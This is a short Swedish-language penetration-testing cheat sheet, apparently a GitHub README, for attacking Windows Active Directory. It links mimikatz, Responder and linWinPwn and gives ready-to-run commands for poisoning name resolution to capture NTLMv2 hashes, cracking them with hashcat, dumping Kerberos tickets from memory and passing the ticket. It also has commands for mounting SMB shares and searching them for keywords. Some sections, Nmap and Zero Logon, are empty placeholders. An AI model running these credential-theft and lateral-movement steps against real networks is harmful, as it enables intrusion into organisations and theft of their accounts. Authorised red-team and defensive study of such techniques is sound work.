# Gunnajs-Playbook
En svensk penetrationsvägvisare

## Tools bby

### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### mimikatz
https://github.com/ParrotSec/mimikatz
### Responder
https://github.com/lgandx/Responder
# VEV

## linWinPwn 
```bash
sudo ./linWinPwn.sh -t <Domän_Kontrollant_IP> -u <AD_konto> -p <AD_lösen>
```
## SMB VEV
### Montera mapp
```bash
sudo mount.cifs <//ip/mapp> <./mapp> -o user=<användare>,password=<lösen>,dom=<domän.com>
```
### Avmontera mapp
```bash
sudo umount.cifs <./mapp>
```
### Söka efter nyckelord
```bash
grep -i <nyckelord> *
```
## Nmap
* in the making 

## Zero Logon
* in the making 
## Responder
### Veva igång responder
```bash
responder -I eth0 -v
```
### Cracka NTLMv2 hashar
```bash
hashcat64.exe -m 5600 ntlm-hashes.txt <lösenlista.txt> -o cracked.txt
```

## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
